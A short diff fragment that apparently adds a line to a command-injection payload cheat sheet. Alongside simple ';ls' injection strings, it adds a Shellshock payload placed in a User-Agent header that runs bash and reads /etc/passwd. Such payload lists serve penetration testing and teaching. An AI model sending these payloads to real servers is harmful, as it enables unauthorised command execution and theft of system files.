@@ -7,6 +7,8 @@ ___
 ;ls
 
 ;ls;
+
+User-Agent: () { :; }; echo ; /bin/bash -c "cat /etc/passwd" >> In User-Agent Header.
 ```
 ## Blind injection
 ```sh
